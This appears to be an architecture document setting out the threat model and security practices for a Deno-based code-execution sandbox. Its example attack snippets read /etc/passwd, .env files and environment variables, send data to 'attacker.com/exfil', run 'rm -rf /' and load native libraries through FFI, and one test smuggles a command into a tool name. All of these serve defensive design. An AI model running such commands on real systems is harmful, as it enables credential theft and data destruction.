# Sandboxing Security Best Practices

**Date:** 2025-11-11 **Owner:** Winston (Architect) **Status:** ✅ COMPLETE **Purpose:** Security
guidelines and threat model for Casys PML code execution sandbox

---

## Executive Summary

Executing untrusted code is **inherently dangerous**. This document provides security patterns,
threat models, and mitigation strategies for Casys PML' Deno-based sandbox implementation.

**Key Security Principles:**

1. **Defense in Depth** - Multiple layers of security controls
2. **Least Privilege** - Minimum permissions required for operation
3. **Fail Secure** - Failures deny access, don't grant it
4. **Assume Breach** - Design for when (not if) sandbox is compromised
5. **Monitor & Alert** - Detect and respond to security events

**Risk Level:** HIGH - Code execution sandbox is Casys PML' highest-risk component.

---

## Table of Contents

1. [Threat Model](#threat-model)
2. [Attack Surface](#attack-surface)
3. [Security Controls](#security-controls)
4. [Defense-in-Depth Layers](#defense-in-depth-layers)
5. [Common Vulnerabilities](#common-vulnerabilities)
6. [Mitigation Strategies](#mitigation-strategies)
7. [Security Testing](#security-testing)
8. [Incident Response](#incident-response)
9. [Security Checklist](#security-checklist)
10. [Future Improvements](#future-improvements)

---

## Threat Model

### Assets to Protect

**1. Host System**

- File system (credentials, secrets, source code)
- Network resources
- System processes
- Environment variables (API keys, passwords)

**2. User Data**

- PII in code submissions
- Intellectual property in prompts/code
- Execution results

**3. Service Availability**

- CPU resources (DoS via infinite loops)
- Memory resources (DoS via memory exhaustion)
- Disk resources (DoS via disk exhaustion)

**4. Other Users**

- Isolation between concurrent executions
- Privacy of execution results

---

### Threat Actors

**1. Malicious User**

- **Motivation:** Gain unauthorized access, steal data, disrupt service
- **Capabilities:** Can submit arbitrary code
- **Intent:** Intentionally hostile

**2. Compromised User Account**

- **Motivation:** Attacker using legitimate credentials
- **Capabilities:** Same as legitimate user + attacker creativity
- **Intent:** Intentionally hostile, appears legitimate

**3. Buggy/Careless User**

- **Motivation:** No malicious intent, just mistakes
- **Capabilities:** Accidentally submits dangerous code
- **Intent:** Unintentional harm

**4. Curious User**

- **Motivation:** "I wonder what happens if..."
- **Capabilities:** Probing for vulnerabilities
- **Intent:** Testing boundaries, may escalate if successful

---

### Threat Scenarios

#### Scenario 1: File System Exfiltration

**Attack:**

```typescript
// User submits code to read sensitive files
const secrets = await Deno.readTextFile("/etc/passwd");
const apiKeys = await Deno.readTextFile("/home/user/.env");
return { secrets, apiKeys };
```

**Impact:** Credential theft, privacy violation, system compromise

**Likelihood:** HIGH (easy to attempt)

**Mitigation:**

- ✅ Deno `--deny-read` (except temp file)
- ✅ File system isolation via permissions
- ⚠️ Monitor permission violations

---

#### Scenario 2: Network Exfiltration

**Attack:**

```typescript
// User submits code to exfiltrate data over network
const secrets = await Deno.readTextFile("/tmp/user-data.json");
await fetch("https://attacker.com/exfil", {
  method: "POST",
  body: JSON.stringify(secrets),
});
```

**Impact:** Data breach, credential theft

**Likelihood:** HIGH (easy to attempt)

**Mitigation:**

- ✅ Deno `--deny-net`
- ✅ Network isolation via permissions
- ⚠️ Monitor network permission violations

---

#### Scenario 3: Subprocess Command Injection

**Attack:**

```typescript
// User submits code to spawn malicious subprocess
const command = new Deno.Command("rm", {
  args: ["-rf", "/"],
});
await command.output();
```

**Impact:** System destruction, data loss

**Likelihood:** HIGH (easy to attempt)

**Mitigation:**

- ✅ Deno `--deny-run`
- ✅ Subprocess spawning denied
- ⚠️ Monitor subprocess permission violations

---

#### Scenario 4: Denial of Service (CPU)

**Attack:**

```typescript
// Infinite loop consumes CPU
while (true) {
  // CPU-intensive operation
  Math.sqrt(Math.random());
}
```

**Impact:** Service unavailable, resource exhaustion

**Likelihood:** HIGH (easy to create accidentally)

**Mitigation:**

- ✅ Timeout enforcement (30s default)
- ✅ Process isolation (kill doesn't affect host)
- ⚠️ Consider rate limiting per user

---

#### Scenario 5: Denial of Service (Memory)

**Attack:**

```typescript
// Memory exhaustion
const data = [];
while (true) {
  data.push(new Array(1024 * 1024).fill(0)); // 1MB arrays
}
```

**Impact:** Service crash, resource exhaustion

**Likelihood:** HIGH (easy to create accidentally)

**Mitigation:**

- ✅ V8 memory limit (512MB default)
- ✅ Process isolation (OOM doesn't affect host)
- ⚠️ Consider per-user quotas

---

#### Scenario 6: FFI / Native Code Execution

**Attack:**

```typescript
// Load malicious native library
const lib = Deno.dlopen("/tmp/malicious.so", {
  exploit: { parameters: [], result: "void" },
});
lib.symbols.exploit();
```

**Impact:** Complete system compromise, arbitrary code execution

**Likelihood:** LOW (requires compiling native code)

**Mitigation:**

- ✅ Deno `--deny-ffi`
- ✅ FFI completely disabled
- ⚠️ Monitor FFI permission violations (should never happen)

---

#### Scenario 7: Environment Variable Exfiltration

**Attack:**

```typescript
// Steal environment variables (often contain secrets)
const env = Deno.env.toObject();
return env; // Contains API keys, passwords, etc.
```

**Impact:** Credential theft, privilege escalation

**Likelihood:** HIGH (easy to attempt)

**Mitigation:**

- ✅ Deno `--deny-env`
- ✅ Environment variable access denied
- ⚠️ Monitor env permission violations

---

#### Scenario 8: Timing Attack / Side Channel

**Attack:**

```typescript
// Use high-resolution timers to leak information
const start = performance.now();
await fetch("https://victim.com/resource");
const duration = performance.now() - start;

// Infer information from timing
if (duration > 100) {
  // Resource exists
}
```

**Impact:** Information disclosure via timing

**Likelihood:** LOW (sophisticated attack)

**Mitigation:**

- ⚠️ Consider `--deny-hrtime` if processing sensitive data
- ⚠️ Currently allow hrtime for performance measurement
- ⚠️ Re-evaluate when handling PII

---

#### Scenario 9: Temp File Race Condition

**Attack:**

```typescript
// Host creates temp file /tmp/abc123.ts
// Attacker replaces it before execution
// Sandbox executes attacker's code
```

**Impact:** Arbitrary code execution

**Likelihood:** LOW (requires precise timing, local access)

**Mitigation:**

- ✅ Temp files created with unique names
- ✅ Atomic write operations
- ⚠️ Use `Deno.makeTempFileSync()` (secure)
- ⚠️ Clean up immediately after execution

---

#### Scenario 10: Resource Exhaustion (Disk)

**Attack:**

```typescript
// Fill disk with temp files (if write allowed)
while (true) {
  await Deno.writeTextFile(
    `/tmp/file_${Math.random()}.txt`,
    "A".repeat(1024 * 1024 * 100), // 100MB
  );
}
```

**Impact:** Disk full, service unavailable

**Likelihood:** LOW (write access denied in sandbox)

**Mitigation:**

- ✅ Deno `--deny-write`
- ✅ No write access in sandbox
- ⚠️ Monitor host disk usage (temp files)

---

## Attack Surface

### Surface 1: Deno Runtime

**Component:** Deno executable and V8 engine

**Risk:** Vulnerabilities in Deno or V8 could bypass sandbox

**Mitigations:**

- ✅ Use latest stable Deno version
- ✅ Subscribe to Deno security advisories
- ✅ Update regularly (patch management)
- ⚠️ Test updates in staging before production

**Monitoring:**

- Track Deno CVEs (https://github.com/denoland/deno/security/advisories)
- Automated dependency scanning

---

### Surface 2: Permission System

**Component:** Deno's `--allow-*` and `--deny-*` flags

**Risk:** Permission bypass or misconfiguration

**Mitigations:**

- ✅ Explicit deny flags (defense-in-depth)
- ✅ Minimal allow flags (only temp file read)
- ✅ Permission verification tests
- ⚠️ Regular security audits of permission config

**Monitoring:**

- Log all permission violation errors
- Alert on unexpected permission patterns

---

### Surface 3: Message Passing Bridge

**Component:** `postMessage()` API for MCP tools

**Risk:** Message injection, command injection, privilege escalation

**Mitigations:**

- ✅ Input validation on all messages
- ✅ Type checking (TypeScript)
- ✅ Schema validation (Zod)
- ⚠️ Rate limiting on tool calls
- ⚠️ Authorization checks (which tools can user call?)

**Monitoring:**

- Log all MCP tool calls
- Alert on suspicious patterns (rapid calls, failed auth)

---

### Surface 4: Serialization/Deserialization

**Component:** JSON serialization of execution results

**Risk:** Prototype pollution, injection attacks

**Mitigations:**

- ✅ Use `JSON.stringify()` / `JSON.parse()` (safe)
- ✅ Avoid `eval()` or `Function()` constructor
- ⚠️ Size limits on serialized results (prevent DoS)
- ⚠️ Sanitize error messages (no stack traces with host paths)

**Monitoring:**

- Track result sizes
- Alert on suspiciously large results

---

### Surface 5: Temp File Management

**Component:** Temporary code files in `/tmp`

**Risk:** Race conditions, file disclosure, disk exhaustion

**Mitigations:**

- ✅ Use `Deno.makeTempFileSync()` (secure random names)
- ✅ Cleanup in `finally` blocks
- ✅ Atomic write operations
- ⚠️ Periodic cleanup of orphaned files
- ⚠️ Disk quota monitoring

**Monitoring:**

- Track temp file creation/deletion
- Alert on disk usage spikes

---

### Surface 6: Logging and Observability

**Component:** Logs containing execution details

**Risk:** PII disclosure, credential leakage in logs

**Mitigations:**

- ✅ PII detection before logging (Story 3.5)
- ✅ Tokenize/redact sensitive data
- ⚠️ Secure log storage (encryption, access control)
- ⚠️ Log retention policies

**Monitoring:**

- Audit log access
- Alert on sensitive data patterns in logs

---

## Security Controls

### 1. Isolation Controls

**1.1 Process Isolation**

- ✅ Separate Deno subprocess per execution
- ✅ No shared memory between executions
- ✅ Process killed after timeout/completion
- ✅ Independent permission contexts

**1.2 File System Isolation**

- ✅ Read access limited to single temp file
- ✅ No write access
- ✅ No access to home directories, /etc, /var, etc.

**1.3 Network Isolation**

- ✅ Complete network denial
- ✅ No DNS resolution
- ✅ No listening sockets
- ✅ MCP tool calls via message passing (not direct network)

**1.4 Resource Isolation**

- ✅ CPU: Timeout enforcement (30s default)
- ✅ Memory: V8 limit (512MB default)
- ⚠️ Disk: Monitored via host process

---

### 2. Access Controls

**2.1 Permission Model**

- ✅ Whitelist-based (explicit allow)
- ✅ Deny flags for critical permissions
- ✅ `--no-prompt` (fail fast, no user interaction)

**2.2 Capability-Based Security**

- ✅ MCP tools exposed via capabilities (message passing)
- ✅ Host validates tool access
- ⚠️ Consider per-user tool allowlists

---

### 3. Input Validation

**3.1 Code Input**

- ⚠️ Syntax validation (TypeScript parser)
- ⚠️ AST analysis for dangerous patterns
- ⚠️ PII detection (Story 3.5)

**3.2 Message Validation**

- ✅ Schema validation for messages (Zod)
- ✅ Type checking (TypeScript)
- ⚠️ Size limits on messages

---

### 4. Output Sanitization

**4.1 Result Serialization**

- ✅ JSON serialization (safe)
- ⚠️ Size limits on results
- ⚠️ Remove internal paths from error messages

**4.2 Error Handling**

- ✅ Structured error types
- ✅ Generic error messages for security violations
- ⚠️ No stack traces with host file paths

---

### 5. Monitoring & Logging

**5.1 Security Events**

- ⚠️ Log all permission violations
- ⚠️ Log all timeout/OOM kills
- ⚠️ Log suspicious patterns

**5.2 Metrics**

- ⚠️ Execution count per user
- ⚠️ Resource usage per execution
- ⚠️ Error rates

---

## Defense-in-Depth Layers

### Layer 1: Permission Enforcement (Deno)

**Control:** Deno's built-in permission system

**Strength:** HIGH - Enforced by runtime

**Bypass:** Deno/V8 vulnerability

**Monitoring:** Permission violation errors

---

### Layer 2: Process Isolation (OS)

**Control:** Separate process per execution

**Strength:** HIGH - Enforced by OS

**Bypass:** Kernel vulnerability, container escape

**Monitoring:** Process lifecycle tracking

---

### Layer 3: Resource Limits (V8 + Timeout)

**Control:** Memory limits, timeouts

**Strength:** MEDIUM - Enforced by V8 and host process

**Bypass:** V8 memory limit bypass, timeout race condition

**Monitoring:** OOM kills, timeout kills

---

### Layer 4: Input Validation (Application)

**Control:** PII detection, syntax validation

**Strength:** MEDIUM - Application-level

**Bypass:** Validation logic bugs

**Monitoring:** Validation rejection rates

---

### Layer 5: Message Passing Bridge (Application)

**Control:** Capability-based tool access

**Strength:** MEDIUM - Application-level

**Bypass:** Message injection, serialization bugs

**Monitoring:** Tool call patterns

---

### Layer 6: Logging & Alerting (Observability)

**Control:** Security event detection

**Strength:** LOW - Detective control, not preventive

**Bypass:** Log tampering, blind spots

**Monitoring:** Security dashboards, alerts

---

## Common Vulnerabilities

### 1. Permission Misconfiguration

**Problem:** Accidentally granting too many permissions

**Example:**

```typescript
// ❌ BAD: Overly permissive
new Deno.Command("deno", {
  args: ["run", "--allow-all", "sandbox.ts"],
});
```

**Fix:**

```typescript
// ✅ GOOD: Minimal permissions
new Deno.Command("deno", {
  args: [
    "run",
    `--allow-read=${tempFile}`,
    "--deny-write",
    "--deny-net",
    "--deny-run",
    "--deny-ffi",
    "--deny-env",
    "sandbox.ts",
  ],
});
```

---

### 2. Path Traversal

**Problem:** User escapes temp directory via `../`

**Example:**

```typescript
// User code attempts:
await Deno.readTextFile("../../../../../etc/passwd");
```

**Fix:** Deno normalizes paths before permission check. `/tmp/abc.ts/../../../../../etc/passwd` →
`/etc/passwd`, which fails permission check. ✅ Already mitigated.

---

### 3. Symbolic Link Attack

**Problem:** Attacker creates symlink in temp directory pointing to sensitive file

**Example:**

```bash
# Attacker pre-creates symlink
ln -s /etc/passwd /tmp/abc123.ts

# Sandbox reads "temp file" → actually reads /etc/passwd
```

**Fix:**

- Use `Deno.makeTempFileSync()` with unique names (collision unlikely)
- Set restrictive permissions on temp directory (750)
- ⚠️ Consider using `Deno.realPathSync()` to resolve symlinks

---

### 4. Time-of-Check to Time-of-Use (TOCTOU)

**Problem:** File contents change between validation and execution

**Example:**

```typescript
// Host validates code
const code = await Deno.readTextFile(tempFile);
validateCode(code);

// Attacker swaps file here (race condition)

// Host executes (now different code)
const result = await executeSandbox(tempFile);
```

**Fix:**

- Write code, then immediately execute
- Don't read file multiple times
- Use atomic operations
- ✅ Current implementation is safe (write once, execute immediately)

---

### 5. Resource Exhaustion Cascade

**Problem:** Many concurrent executions exhaust host resources

**Example:**

```typescript
// 100 users submit code simultaneously
// Each spawns subprocess
// Host runs out of memory/file descriptors
```

**Fix:**

- ⚠️ Rate limiting per user
- ⚠️ Global concurrency limit
- ⚠️ Queue system for execution requests
- ⚠️ Resource monitoring and backpressure

---

### 6. Error Message Information Disclosure

**Problem:** Error messages reveal internal paths, secrets

**Example:**

```typescript
// Error exposes host file system structure
Error: Cannot read file: /home/pml/src/gateway/api-key.ts
```

**Fix:**

```typescript
// ✅ Sanitize error messages
function sanitizeError(error: Error): Error {
  // Remove absolute paths
  const sanitized = error.message.replace(/\/[\w\/\-\.]+/g, "[PATH]");
  return new Error(sanitized);
}
```

---

### 7. Infinite Loop Detection Bypass

**Problem:** User creates loop that appears to make progress but never completes

**Example:**

```typescript
// Not a tight loop - makes system calls
let i = 0;
while (true) {
  await new Promise((resolve) => setTimeout(resolve, 1));
  i++;
  if (i % 1000 === 0) console.log(i); // Appears to progress
}
```

**Fix:**

- ✅ Timeout enforced regardless of "progress"
- ✅ Timeout kills process after 30s
- No bypass possible

---

### 8. Prototype Pollution

**Problem:** Attacker pollutes `Object.prototype` to affect host

**Example:**

```typescript
// Sandbox code
Object.prototype.polluted = "malicious";

// If this affects host, it's a problem
```

**Fix:**

- ✅ Process isolation prevents prototype pollution from affecting host
- Sandbox and host run in separate V8 isolates
- No shared state

---

## Mitigation Strategies

### 1. Secure Defaults

**Principle:** Default configuration should be secure

**Implementation:**

```typescript
export class DenoSandboxExecutor {
  constructor(config?: SandboxConfig) {
    this.config = {
      // Secure defaults
      timeout: 30000, // 30s max
      memoryLimit: 512, // 512MB max
      allowedReadPaths: [], // No extra read access
      denyNetwork: true, // Always deny network
      denyWrite: true, // Always deny write
      denyRun: true, // Always deny subprocess
      denyFfi: true, // Always deny FFI
      denyEnv: true, // Always deny env
      ...config, // User overrides (but denies can't be overridden)
    };
  }
}
```

---

### 2. Fail Secure

**Principle:** Failures should deny access, not grant it

**Implementation:**

```typescript
try {
  const result = await executeSandbox(code);
  return result;
} catch (error) {
  // ✅ On error, return failure (don't grant access)
  return {
    success: false,
    error: sanitizeError(error),
  };
}
```

---

### 3. Least Privilege

**Principle:** Grant minimum permissions required

**Implementation:**

```typescript
// ✅ Only allow reading temp file
--allow-read=/tmp/abc123.ts

// ❌ Don't do this
--allow-read=/tmp
```

---

### 4. Input Validation

**Principle:** Validate all inputs before processing

**Implementation:**

```typescript
export function validateCodeInput(code: string): ValidationResult {
  // Size limit
  if (code.length > 100_000) {
    return { valid: false, error: "Code too large" };
  }

  // Syntax validation (TypeScript parser)
  try {
    // Parse as TypeScript
    const ast = parse(code);
  } catch (error) {
    return { valid: false, error: "Syntax error" };
  }

  // PII detection (Story 3.5)
  const pii = detectPII(code);
  if (pii.detected) {
    return { valid: false, error: "PII detected", pii };
  }

  return { valid: true };
}
```

---

### 5. Output Sanitization

**Principle:** Sanitize all outputs before returning

**Implementation:**

```typescript
function sanitizeResult(result: ExecutionResult): ExecutionResult {
  // Remove internal paths from errors
  if (result.error) {
    result.error.message = sanitizeErrorMessage(result.error.message);
    result.error.stack = undefined; // No stack traces
  }

  // Limit result size
  const serialized = JSON.stringify(result);
  if (serialized.length > 1_000_000) { // 1MB limit
    return {
      success: false,
      error: { type: "RuntimeError", message: "Result too large" },
    };
  }

  return result;
}
```

---

### 6. Defense in Depth

**Principle:** Multiple layers of security controls

**Implementation:**

- Layer 1: Deno permissions (runtime enforcement)
- Layer 2: Process isolation (OS enforcement)
- Layer 3: Resource limits (V8 + host enforcement)
- Layer 4: Input validation (application enforcement)
- Layer 5: Output sanitization (application enforcement)
- Layer 6: Monitoring & alerting (detection)

---

### 7. Monitoring & Alerting

**Principle:** Detect and respond to security events

**Implementation:**

```typescript
function logSecurityEvent(event: SecurityEvent) {
  // Log to secure audit log
  logger.security({
    type: event.type,
    timestamp: new Date().toISOString(),
    userId: event.userId,
    details: event.details,
    severity: event.severity,
  });

  // Alert on critical events
  if (event.severity === "critical") {
    alerting.send({
      channel: "security",
      message: `Security event: ${event.type}`,
      details: event.details,
    });
  }
}
```

---

## Security Testing

### 1. Permission Violation Tests

**Purpose:** Verify permissions are enforced

**Tests:**

```typescript
// Test filesystem access denied
Deno.test("Sandbox denies /etc/passwd read", async () => {
  const result = await executor.execute(`
    const content = await Deno.readTextFile("/etc/passwd");
    return content;
  `);

  assertEquals(result.success, false);
  assertEquals(result.error?.type, "PermissionError");
});

// Test network access denied
Deno.test("Sandbox denies network fetch", async () => {
  const result = await executor.execute(`
    const response = await fetch("https://example.com");
    return response.status;
  `);

  assertEquals(result.success, false);
  assertEquals(result.error?.type, "PermissionError");
});

// Test subprocess spawning denied
Deno.test("Sandbox denies subprocess", async () => {
  const result = await executor.execute(`
    const command = new Deno.Command("ls", { args: ["/"] });
    await command.output();
  `);

  assertEquals(result.success, false);
  assertEquals(result.error?.type, "PermissionError");
});
```

---

### 2. Resource Exhaustion Tests

**Purpose:** Verify resource limits enforced

**Tests:**

```typescript
// Test timeout enforcement
Deno.test("Sandbox enforces timeout", async () => {
  const executor = new DenoSandboxExecutor({ timeout: 1000 });

  const result = await executor.execute(`
    while (true) {
      await new Promise(resolve => setTimeout(resolve, 100));
    }
  `);

  assertEquals(result.success, false);
  assertEquals(result.error?.type, "TimeoutError");
});

// Test memory limit enforcement
Deno.test("Sandbox enforces memory limit", async () => {
  const executor = new DenoSandboxExecutor({ memoryLimit: 128 });

  const result = await executor.execute(`
    const data = [];
    while (true) {
      data.push(new Array(1024 * 1024).fill(0)); // 1MB
    }
  `);

  assertEquals(result.success, false);
  assertEquals(result.error?.type, "MemoryError");
});
```

---

### 3. Injection Attack Tests

**Purpose:** Verify input validation works

**Tests:**

```typescript
// Test command injection (via MCP bridge)
Deno.test("Message bridge prevents command injection", async () => {
  const maliciousMessage = {
    type: "call_tool",
    name: "github.search'; rm -rf /; echo '",
    args: {},
  };

  // Should be rejected by validation
  const result = await processMessage(maliciousMessage);
  assertEquals(result.success, false);
  assertEquals(result.error, "Invalid tool name");
});
```

---

### 4. Penetration Testing

**Purpose:** Simulate real attacks

**Scenarios:**

1. Attempt to read `/etc/passwd`, `/home/user/.bashrc`, `.env` files
2. Attempt to exfiltrate data over network
3. Attempt to spawn reverse shell
4. Attempt CPU/memory exhaustion
5. Attempt prototype pollution
6. Attempt path traversal (`../../etc/passwd`)
7. Attempt timing attacks
8. Attempt FFI exploitation

**Frequency:** Before each major release

---

## Incident Response

### Detection

**Security Events to Monitor:**

- Permission violation errors (read, write, net, run, ffi, env)
- Timeout kills
- OOM kills
- Suspiciously large result sizes
- Rapid execution requests from single user
- Failed validation (syntax, PII)

---

### Response Plan

**1. Detect**

- Security monitoring dashboard
- Automated alerts on suspicious patterns

**2. Triage**

- Severity: Critical, High, Medium, Low
- Impact: Data breach, DoS, Privilege escalation
- Affected users: Single user, multiple users, all users

**3. Contain**

- Rate limit affected user
- Temporarily disable execute_code tool if necessary
- Kill running sandboxes

**4. Investigate**

- Review audit logs
- Analyze attack code
- Determine root cause

**5. Remediate**

- Patch vulnerability
- Update permissions/limits
- Deploy fix

**6. Communicate**

- Notify affected users (if data breach)
- Post-mortem document
- Security advisory (if applicable)

---

## Security Checklist

### Pre-Deployment Checklist

- [ ] All permission tests passing
- [ ] Resource exhaustion tests passing
- [ ] Penetration testing completed
- [ ] Deno version up-to-date (security patches)
- [ ] PII detection enabled (Story 3.5)
- [ ] Logging and monitoring configured
- [ ] Alerting rules configured
- [ ] Incident response plan documented
- [ ] Rate limiting implemented
- [ ] Security review completed

---

### Runtime Checklist (Per Execution)

- [ ] Input validation passed
- [ ] Permissions correctly configured
- [ ] Timeout set
- [ ] Memory limit set
- [ ] Temp file cleanup scheduled
- [ ] Error sanitization enabled
- [ ] Security event logging enabled

---

### Periodic Review Checklist (Monthly)

- [ ] Review security logs for anomalies
- [ ] Check for Deno CVEs and update
- [ ] Review permission configuration
- [ ] Test resource limits still effective
- [ ] Review incident response plan
- [ ] Update threat model if needed

---

## Future Improvements

### Short-Term (Epic 3)

1. **Story 3.5: PII Detection**
   - Prevents credential leakage in code
   - Tokenizes sensitive data in logs

2. **Story 3.7: Integration Tests**
   - Comprehensive security test suite
   - Automated security regression tests

3. **Rate Limiting**
   - Per-user execution limits
   - Global concurrency limits

---

### Medium-Term (Post-Epic 3)

1. **User Quotas**
   - CPU time limits per user
   - Execution count limits per day
   - Storage limits for results

2. **Enhanced Monitoring**
   - Real-time security dashboard
   - Anomaly detection (ML-based)
   - User behavior analysis

3. **AST Analysis**
   - Static analysis of code before execution
   - Detect dangerous patterns (e.g., infinite loops)
   - Whitelist/blacklist of allowed APIs

---

### Long-Term

1. **Container Isolation**
   - Run sandboxes in Docker containers
   - Additional layer of isolation
   - Resource limits at container level

2. **WebAssembly Sandbox**
   - Explore WASM as alternative to Deno
   - Even stricter isolation
   - Language-agnostic

3. **Formal Security Audit**
   - Third-party security firm
   - Penetration testing by experts
   - Certification (e.g., SOC 2)

---

## References

**Deno Security:**

- [Deno Security Model](https://deno.land/manual/runtime/security)
- [Deno Security Advisories](https://github.com/denoland/deno/security/advisories)

**Sandboxing Best Practices:**

- [OWASP Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)
- [Google's Sandboxing Guide](https://chromium.googlesource.com/chromium/src/+/master/docs/design/sandbox.md)

**Casys PML Documentation:**

- [Deno Permissions Deep Dive](./deno-permissions-deep-dive.md)
- [Deno Sandbox POC Summary](./deno-sandbox-poc-summary.md)
- [Architecture Spike - MCP Tools Injection](./architecture-spike-mcp-tools-injection.md)

---

## Conclusion

Sandboxing untrusted code is **inherently risky**, but with proper controls, Casys PML can execute
user code securely.

**Key Takeaways:**

1. **Defense in Depth** - Multiple security layers
2. **Least Privilege** - Minimal permissions
3. **Fail Secure** - Failures deny access
4. **Monitor & Alert** - Detect and respond to threats
5. **Regular Updates** - Patch management critical

**Risk Acceptance:**

- Some risk is unavoidable when executing untrusted code
- Mitigations reduce risk to acceptable levels
- Continuous monitoring and improvement required

**Next Steps:**

- Implement security controls in Story 3.1
- Add PII detection in Story 3.5
- Comprehensive security tests in Story 3.7
- Continuous security monitoring post-launch

---

**Document Status:** ✅ COMPLETE **Date:** 2025-11-11 **Owner:** Winston (Architect)
